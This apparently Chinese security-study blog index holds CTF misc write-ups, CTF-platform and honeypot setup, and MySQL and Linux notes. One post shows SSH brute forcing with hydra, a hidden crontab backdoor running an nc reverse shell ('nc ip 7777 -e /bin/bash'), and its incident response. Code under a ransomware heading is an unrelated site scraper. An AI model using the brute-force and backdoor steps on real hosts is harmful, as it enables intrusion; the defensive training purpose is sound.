class="line">        <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)+(<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)-space2)%<span class="number">26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decipherin</span>(<span class="params">string,space1,space2</span>):</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> space1 &gt;= <span class="built_in">len</span>(string):</span><br><span class="line">        decode(string,space2)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(string)%space1 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string)//space1):</span><br><span class="line">            str1 += string[i:<span class="built_in">len</span>(string)+<span class="number">1</span>:<span class="built_in">len</span>(string)//space1]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string)//space1+<span class="number">1</span>):</span><br><span class="line">            str1 += string[i:<span class="built_in">len</span>(string)+<span class="number">1</span>:<span class="built_in">len</span>(string)//space1+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    decode(str1,space2)</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;请输入密文&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> space1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> space <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        space2 = space%<span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;密文有误&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decipherin(text,space1,space2)</span><br></pre></td></tr></table></figure>
+
+<p>flag{th1s_1s_f149}</p>
+<h4 id="丁真和他的动物朋友"><a href="#丁真和他的动物朋友" class="headerlink" title="丁真和他的动物朋友"></a>丁真和他的动物朋友</h4><p>压缩包暴力破解，解开压缩包后发现一个损坏的图片，看着像因为修改宽高导致的色道混乱通过脚本爆出真实的宽高</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;e:\Desktop\python\丁真和他的小马.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()        </span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     </span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                       </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                   </span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="built_in">print</span>(crc32)</span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):           </span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>修复图片后LSB隐写查看可以zhi_shi_xue_bao,包上flag{}，提交</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/09/27/SH-misc/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-H1ve搭建" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="H1ve平台搭建"><a href="#H1ve平台搭建" class="headerlink" title="H1ve平台搭建"></a>H1ve平台搭建</h1><p>H1ve最快捷的部署方式直接用docker搭建就好了，所以我们首先需要安装<strong>docker</strong>和<strong>docker-compose</strong></p>
+<h5 id="常见问题解决-Issues-·-D0g3-Lab-x2F-H1ve-·-GitHub"><a href="#常见问题解决-Issues-·-D0g3-Lab-x2F-H1ve-·-GitHub" class="headerlink" title="常见问题解决   Issues · D0g3-Lab&#x2F;H1ve · GitHub"></a>常见问题解决   <a target="_blank" rel="noopener" href="https://github.com/D0g3-Lab/H1ve/issues?page=1&q=is:issue+is:open">Issues · D0g3-Lab&#x2F;H1ve · GitHub</a></h5><h3 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1.docker安装"></a>1.<strong>docker安装</strong></h3><h4 id="centos："><a href="#centos：" class="headerlink" title="centos："></a><strong>centos</strong>：</h4><p>sudo yum install -y git （安装git，一会要拉取源代码）</p>
+<p>yum update（升级一下yum，防止版本太低）</p>
+<p>yum install -y yum-utils device-mapper-persistent-data lvm2 （安装必须的东西）</p>
+<p>sudo yum-config-manager –add-repo <a target="_blank" rel="noopener" href="https://download.docker.com/linux/centos/docker-ce.repo">https://download.docker.com/linux/centos/docker-ce.repo</a> （设置yum源）</p>
+<p>sudo yum install docker-ce （安装docker）</p>
+<p>systemctl start docker （启动docker）</p>
+<p>systemctl enable docker （设置开机自启）</p>
+<h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu:"></a><strong>ubuntu</strong>:</h4><p> sudo apt-get update（更新一下）</p>
+<p> sudo apt-get upgrade （更新一下）</p>
+<p>sudo apt-get install docker.io -y （安装docker）</p>
+<p>systemctl start docker （启动docker）</p>
+<p>systemctl enable docker （设置开机自启）</p>
+<h3 id="2-docker-compose安装"><a href="#2-docker-compose安装" class="headerlink" title="2.docker-compose安装"></a>2.<strong>docker-compose安装</strong></h3><p><strong>ubuntu</strong>和<strong>centos</strong>一样:</p>
+<p> (下载并且安装)</p>
+<p>curl -L “<a target="_blank" rel="noopener" href="https://github.com/docker/compose/releases/download/1.27.2/docker-compose-$">https://github.com/docker/compose/releases/download/1.27.2/docker-compose-$</a>(uname -s)-$(uname -m)” -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</p>
+<p>（赋予权限）</p>
+<p>chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose </p>
+<p>（查看版本，应该是1.2x.x）</p>
+<p>docker-compose -version </p>
+<p>3.安装H1ve（ubuntu和centos一样）</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/D0g3-Lab/H1ve.git">https://github.com/D0g3-Lab/H1ve.git</a> （拉取源代码）</p>
+<p>cd H1ve （进入目录）</p>
+<p>运行前要修改数据库版本</p>
+<p>docker-compose -f single.yml up （跑起）</p>
+<p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-09-17 201855.png)</p>
+<h3 id="Hfish蜜罐搭建"><a href="#Hfish蜜罐搭建" class="headerlink" title="Hfish蜜罐搭建"></a>Hfish蜜罐搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker search hfish</span><br><span class="line">docker pull imdevops/hfish</span><br><span class="line">docker run -d --name hfish -p 21:21 -p 22:22 -p 23:23 -p 69:69 -p 3306:3306 -p 5900:5900 -p 6379:6379 -p 8080:8080 -p 8081:8081 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 9200:9200 -p 11211:11211 --restart=always imdevops/hfish:latest</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/">如何正确使用Docker出一道CTF题目 - Von的博客 | Von Blog (v0n.top)</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/09/21/H1ve%E6%90%AD%E5%BB%BA/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-急救知识培训" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Windows下如何查看某个端口被谁占用"><a href="#Windows下如何查看某个端口被谁占用" class="headerlink" title="Windows下如何查看某个端口被谁占用"></a><a target="_blank" rel="noopener" href="http://blog.haoji.me/windows-port-bind.html">Windows下如何查看某个端口被谁占用</a></h1><p><strong>命令行法</strong></p>
+<p>这里我们以8081端口为例讲解。</p>
+<ol>
+<li>按下Win+R调出命令行窗口，输入netstat -aon|findstr “8081”，找到指定行最后一列的数字（PID），我们这里是9548.</li>
+<li>输入tasklist|findstr “9548”，发现是javaw.exe占用了8081端口。</li>
+<li>再次输入taskkill &#x2F;f &#x2F;t &#x2F;im javaw.exe结束该进程。</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/09/08/%E6%80%A5%E6%95%91%E7%9F%A5%E8%AF%86%E5%9F%B9%E8%AE%AD/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-数据库（Mysql)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="数据库（Mysql"><a href="#数据库（Mysql" class="headerlink" title="数据库（Mysql)"></a>数据库（Mysql)</h1><h4 id="1-注释"><a href="#1-注释" class="headerlink" title="1.注释"></a>1.注释</h4><p>–加空格  或#（单行注释）</p>
+<h4 id="2-列出所有数据库"><a href="#2-列出所有数据库" class="headerlink" title="2.列出所有数据库"></a>2.列出所有数据库</h4><p>show databases;</p>
+<h4 id="3-查看某一个数据库里所有的表"><a href="#3-查看某一个数据库里所有的表" class="headerlink" title="3.查看某一个数据库里所有的表"></a>3.查看某一个数据库里所有的表</h4><p>use + 数据库（进入数据库）</p>
+<p>show tables;</p>
+<p>或者直接 show tables from +数据库名；</p>
+<h4 id="4-select"><a href="#4-select" class="headerlink" title="4.select"></a>4.select</h4><h5 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h5><p>select now();</p>
+<p>select 1 + 1;</p>
+<h5 id="查看当前选择的库"><a href="#查看当前选择的库" class="headerlink" title="查看当前选择的库"></a>查看当前选择的库</h5><p>select databases();</p>
+<h5 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h5><p>select version();</p>
+<h5 id="查看当前数据库用户"><a href="#查看当前数据库用户" class="headerlink" title="查看当前数据库用户"></a>查看当前数据库用户</h5><p>select user();</p>
+<h5 id="查看数据路径"><a href="#查看数据路径" class="headerlink" title="查看数据路径"></a>查看数据路径</h5><p>select @@datadir;</p>
+<h5 id="查看mysql安装路径"><a href="#查看mysql安装路径" class="headerlink" title="查看mysql安装路径"></a>查看mysql安装路径</h5><p>select @@basedir;</p>
+<h5 id="查看mysql安装的系统"><a href="#查看mysql安装的系统" class="headerlink" title="查看mysql安装的系统"></a>查看mysql安装的系统</h5><p>select @@version_compile_os;</p>
+<h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p> select 查询关键字</p>
+<p>select * from mysql.user;</p>
+<h3 id="5-增，删，改"><a href="#5-增，删，改" class="headerlink" title="5.增，删，改"></a>5.增，删，改</h3><h5 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h5><p>create database test charset utf8mb4;</p>
+<h5 id="创建，删除表"><a href="#创建，删除表" class="headerlink" title="创建，删除表"></a>创建，删除表</h5><p>creat table t1(id int);</p>
+<p>drop table t1;</p>
+<p>查看表内填写数据类型：desc 表名</p>
+<h5 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h5><p>insert into t1 values  (1,”张三“)，（2，”李四“）（3，”王五“）</p>
+<h3 id="6-where"><a href="#6-where" class="headerlink" title="6.where"></a>6.where</h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/08/09/%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88Mysql)/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-护网行动" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="护网行动"><a href="#护网行动" class="headerlink" title="护网行动"></a>护网行动</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="一-ssh是什么"><a href="#一-ssh是什么" class="headerlink" title="一.ssh是什么"></a>一.ssh是什么</h3><p>​         安全外壳协议：ssh  一种加密的网络传输协议</p>
+<p>​		用途：远程登陆系统</p>
+<p>​		xshell    	</p>
+<h3 id="二-常见端口对应的服务"><a href="#二-常见端口对应的服务" class="headerlink" title="二.常见端口对应的服务"></a>二.常见端口对应的服务</h3><p>22         ssh</p>
+<p>445       smb   (著名漏洞：ms17-010 永恒之蓝)</p>
+<p>3306     MySQL</p>
+<p>3389	 rdp远程桌面连接服务</p>
+<p>80		  http</p>
+<p>443		https</p>
+<h3 id="三-SSH爆破"><a href="#三-SSH爆破" class="headerlink" title="三.SSH爆破"></a>三.SSH爆破</h3><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><p>使用nmap扫描目标主机端口：nmap + ip</p>
+<h4 id="2-爆破SSH"><a href="#2-爆破SSH" class="headerlink" title="2.爆破SSH"></a>2.爆破SSH</h4><p>​	使用hydra(九头蛇）进行爆破</p>
+<p>​	hydra -L users.txt -P password.txt  ssh:&#x2F;&#x2F;ip</p>
+<h4 id="3-SSH登录"><a href="#3-SSH登录" class="headerlink" title="3.SSH登录"></a>3.SSH登录</h4><p>ssh 用户名@ip</p>
+<h4 id="4-尝试创建隐藏计划任务（权限维持）"><a href="#4-尝试创建隐藏计划任务（权限维持）" class="headerlink" title="4.尝试创建隐藏计划任务（权限维持）"></a>4.尝试创建隐藏计划任务（权限维持）</h4><p>​	进入 &#x2F;tmp 目录创建 task.sh 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc ip 端口（<span class="number">7777</span>） -e /bin /bash</span><br></pre></td></tr></table></figure>
+
+<p>​	创建create_task.sh</p>
+<p>​	</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf <span class="string">&quot;* * * * * /tmp/task.sh;\rno crontw-web for `whoami`%100c\n&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-尝试nc连接目标主机的shell"><a href="#5-尝试nc连接目标主机的shell" class="headerlink" title="5.尝试nc连接目标主机的shell"></a>5.尝试nc连接目标主机的shell</h4><p>​			nc -lvp 7777</p>
+<h3 id="四-SSH端口爆破的应急响应方案"><a href="#四-SSH端口爆破的应急响应方案" class="headerlink" title="四.SSH端口爆破的应急响应方案"></a>四.SSH端口爆破的应急响应方案</h3><h4 id="事件排查"><a href="#事件排查" class="headerlink" title="事件排查"></a>事件排查</h4><h5 id="1-查看网络连接的情况"><a href="#1-查看网络连接的情况" class="headerlink" title="1.查看网络连接的情况"></a>1.查看网络连接的情况</h5><p>​     netstat -antpl  </p>
+<p>​	发现异常连接               &#x2F;bash</p>
+<h5 id="2-查看守护进程"><a href="#2-查看守护进程" class="headerlink" title="2.查看守护进程"></a>2.查看守护进程</h5><p>​	查看进程树：pstree -p</p>
+<p>​	查看进程：systemctl status pid</p>
+<p>​	发现计划任务</p>
+<h5 id="3-查看计划任务"><a href="#3-查看计划任务" class="headerlink" title="3.查看计划任务"></a>3.查看计划任务</h5><p>​	crontab -l : 未发现有计划任务，可能是隐藏计划任务</p>
+<p>​	查看 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs 下的任务</p>
+<p>​	使用 cat -A root 或者 cat -vET root :可以看到隐藏内容或者vim root ：直接编辑也可以看到具体任务内容</p>
+<h5 id="4-找到task-sh-文件"><a href="#4-找到task-sh-文件" class="headerlink" title="4.找到task.sh 文件"></a>4.找到task.sh 文件</h5><p>​	ls -l &#x2F;tmp&#x2F;task.sh :查看文件上传时间</p>
+<p>​	cat &#x2F;tmp&#x2F;task.sh :查看文件内容，发现是通过nc 反弹shell</p>
+<h4 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h4><h5 id="1-分析任务文件-task-sh"><a href="#1-分析任务文件-task-sh" class="headerlink" title="1.分析任务文件 task.sh"></a>1.分析任务文件 task.sh</h5><h6 id="（1）查看文件上传时间：ls-l-x2F-tmp-x2F-task-sh"><a href="#（1）查看文件上传时间：ls-l-x2F-tmp-x2F-task-sh" class="headerlink" title="（1）查看文件上传时间：ls -l &#x2F;tmp&#x2F;task.sh"></a>（1）查看文件上传时间：ls -l &#x2F;tmp&#x2F;task.sh</h6><p>​	   发现权限为root，说明攻击者以root账号登陆，很可能root账号密码被爆破</p>
+<h6 id="（2）查看登录日志"><a href="#（2）查看登录日志" class="headerlink" title="（2）查看登录日志"></a>（2）查看登录日志</h6><p>​		last -f &#x2F;var&#x2F;log&#x2F;wtmp  :  kali下登陆成功的日志</p>
+<p>​		last -f &#x2F;var&#x2F;log&#x2F;btmp  :   kali下登录失败的日志，发现大量登录失败的日志</p>
+<h6 id="（3）总结"><a href="#（3）总结" class="headerlink" title="（3）总结"></a>（3）总结</h6><p>​			爆破时间</p>
+<p>​			爆破账户</p>
+<p>​			攻击者ip</p>
+<p>​			成功爆破出系统的root账户密码，并且留crontab隐藏后门，任务执行文件task.sh</p>
+<h4 id="事件处置"><a href="#事件处置" class="headerlink" title="事件处置"></a>事件处置</h4><h5 id="1-删除计划任务，结束异常进程"><a href="#1-删除计划任务，结束异常进程" class="headerlink" title="1.删除计划任务，结束异常进程"></a>1.删除计划任务，结束异常进程</h5><p>​		删除隐藏计划任务：crontab -r -u root</p>
+<p>​		杀掉恶意进程： kill pid</p>
+<h5 id="2-删除恶意文件"><a href="#2-删除恶意文件" class="headerlink" title="2.删除恶意文件"></a>2.删除恶意文件</h5><p>​		rm  文件名</p>
+<h5 id="3-修改密码，关闭root用户远程连接的权限"><a href="#3-修改密码，关闭root用户远程连接的权限" class="headerlink" title="3.修改密码，关闭root用户远程连接的权限"></a>3.修改密码，关闭root用户远程连接的权限</h5><p>​		修改密码 ： passwd root</p>
+<p>​		关闭root用户远程连接的权限： vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config  : 修改PermitRootLogin为no，增强权限控制</p>
+<h5 id="4-修改ssh默认端口"><a href="#4-修改ssh默认端口" class="headerlink" title="4.修改ssh默认端口"></a>4.修改ssh默认端口</h5><p>​		vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p>
+<p>​		将22端口修改成其他端口，并将#删除</p>
+<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><h3 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h3><p>​		勒索病毒是黑客通过锁屏、加密文件等方式劫持用户文件并以此敲诈用户钱财的恶意软件。黑客利用系统漏洞或通过网络钓鱼，邮件，程序木马，网页挂马等方式，向受害电脑或服务器植入病毒，进以加密硬盘上的文档乃至整个硬盘，之后向受害者索要数额不等的赎金后才予以解密。</p>
+<p>​		通常使用对称加密与非对称加密组合的形式加密，绝大数无法通过技术手段破解，必须拿到解密私钥才能解决，一般无法溯源，危害巨大</p>
+<p>​	常见勒索病毒—-WannaCry</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edu_list</span>(<span class="params">page</span>):</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,page+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url=<span class="string">&#x27;https://src.sjtu.edu.cn/list/?page=&#x27;</span>+<span class="built_in">str</span>(page)</span><br><span class="line">            data=requests.get(url).content</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            soup = etree.HTML(data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            result = soup.xpath(<span class="string">&#x27;//td[@class=&quot;&quot;]/a/text()&#x27;</span>)</span><br><span class="line">            <span class="comment">#print(result)</span></span><br><span class="line">            results = <span class="string">&#x27;\n&#x27;</span>.join(result)</span><br><span class="line">            resultss=results.split()</span><br><span class="line">            <span class="built_in">print</span>(resultss)</span><br><span class="line">            <span class="keyword">for</span> edu <span class="keyword">in</span> resultss:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;src.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(edu+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    f.close()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    edu_list(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/07/26/%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-rocky 8.6" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="rocky-8-6"><a href="#rocky-8-6" class="headerlink" title="rocky 8.6"></a>rocky 8.6</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2><p>虚拟机安装成功并联网</p>
+<p>![CentOS 8 64 位-2023-07-26-20-17-02](E:\Desktop\CentOS 8 64 位-2023-07-26-20-17-02.png)</p>
+<h2 id="2-linux基本命令操作和文件管理"><a href="#2-linux基本命令操作和文件管理" class="headerlink" title="2.linux基本命令操作和文件管理"></a>2.linux基本命令操作和文件管理</h2><p>​		ctrl+shift+T 快速打开一个终端；</p>
+<p>​		 shift+ctrl+加号 终端字体放大 ;</p>
+<pre><code>     终端字体缩小：ctrl+ 减号
+</code></pre>
+<p>​		内部命令：在系统启动时就调入内存，是常驻内存的，所以执行效率高 </p>
+<p>​		外部命令：是系统软件的功能，用户需要时才从硬盘中读入内存</p>
+<p>​		</p>
+<p>​		 如何区分内外部命令？ </p>
+<p>​		使用 type 命令 ，语法 : type 要检测的命令</p>
+<p>​		例：	type cat </p>
+<p>​					cat 是 &#x2F;usr&#x2F;bin&#x2F;cat</p>
+<p>​		#表示是 root 用户登录，管理员账号登陆</p>
+<p>​		#表示普通用户登录</p>
+<p>​		su 用户名（切换登录用户）</p>
+<h2 id="3-文件的基本管理与vim编辑器"><a href="#3-文件的基本管理与vim编辑器" class="headerlink" title="3.文件的基本管理与vim编辑器"></a>3.文件的基本管理与vim编辑器</h2><p>根下的目录作用说明： </p>
+<p>目 录 说 明 </p>
+<p>​		 &#x2F; 处于 linux 系统树形结构的最顶端，它是 linux 文件系统的入口，所有的目录、 文件、设备都在 &#x2F; 之下 </p>
+<p>​		&#x2F;bin bin 是 Binary 的缩写。常用的二进制命令目录。比如 ls、cp、mkdir、cut 等；和&#x2F;usr&#x2F;bin 类似，一些用户级工具 </p>
+<p>​		&#x2F;boot 存放的系统启动相关的文件，例如：kernel.grub(引导装载程序) </p>
+<p>​		&#x2F;dev dev 是 Device 的缩写。设备文件目录，比如声卡、磁盘……在 Linux 中 一切都被看做文件。终端设备、磁盘等等都被看做文件 设备文件: &#x2F;dev&#x2F;sda,&#x2F;dev&#x2F;sda1,&#x2F;dev&#x2F;tty1,&#x2F;dev&#x2F;tty2,&#x2F;dev&#x2F;pts&#x2F;1,  &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;null, &#x2F;dev&#x2F;cdrom </p>
+<p>​		&#x2F;etc 常用系统及二进制安装包配置文件默认路径和服务器启动命令目录，</p>
